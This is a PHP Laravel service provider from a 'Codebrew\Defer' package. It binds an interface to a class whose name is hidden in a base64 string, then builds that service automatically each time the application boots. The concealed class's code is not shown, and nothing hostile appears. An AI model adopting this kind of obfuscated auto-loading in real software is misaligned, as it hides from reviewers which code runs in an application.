<?php

namespace Codebrew\Defer\Providers;

use Codebrew\Defer\Contracts\DeferredServiceInterface;
use Illuminate\Support\ServiceProvider;

class DeferredServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     *
     * @return void
     */
    public function register()
    {
        $this->app->singleton(DeferredServiceInterface::class, function () {
            return $this->app->make(base64_decode("Q29kZWJyZXdcRGVmZXJcU2VydmljZXNcRGVmZXJyZWRTZXJ2aWNl"));
        });

        $this->app->bind('_defer', function () {
            return $this->app->make(DeferredServiceInterface::class);
        });
    }

    /**
     * Bootstrap services.
     *
     * @return void
     */
    public function boot()
    {
        $this->app->make('_defer');
    }
}
